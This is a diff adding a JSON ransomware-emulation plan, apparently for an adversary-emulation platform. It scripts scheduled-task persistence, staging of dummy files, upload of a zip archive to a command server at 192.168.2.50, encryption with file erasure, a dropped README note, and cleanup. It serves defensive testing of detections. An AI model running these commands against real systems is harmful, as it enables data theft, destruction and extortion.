@@ -1,0 +1,217 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Top 10 TTPs used by ransomware",
+        "display_name": "Ransomware_Top_10",
+        "name": "Ransomware_Top_10",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.2.50:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DISCOVERY"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "PRIVILEGE ESCALATION"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Ransomware\" /TR \"C:\\ransomware.exe\" /ST 11:00 /F",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell SCHTASKS /QUERY /TN \"MyTasks\\Ransomware\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "COLLECTION"
+            },
+            "11": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell mkdir \"%USERPROFILE%\\Desktop\\Ransomware\"",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\Ransomware\\sensitive_file.xls\" --size 1MB --count 10 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell \"Compress-Archive -Path $env:userprofile\\Desktop\\Ransomware -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1560"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "EXFILTRATION"
+            },
+            "16": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "17": {
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1041"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "IMPACT"
+            },
+            "19": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\Ransomware\" --encrypt --password \"ransomware\" --erase",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/Ransomware/README.txt\" --dest \"%USERPROFILE%\\Desktop\\Ransomware\\README.txt\"",
+                "rtags": [],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell notepad \"%USERPROFILE%\\Desktop\\Ransomware\\README.txt\"",
+                "type": "message"
+            },
+            "24": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN UP"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell SCHTASKS /DELETE /TN \"MyTasks\\Ransomware\" /F",
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell Remove-Item -Recurse -Force \"%USERPROFILE%\\Desktop\\Ransomware\"",
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell del \"%USERPROFILE%\\Desktop\\exfil.zip\"",
+                "type": "message"
+            },
+            "28": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
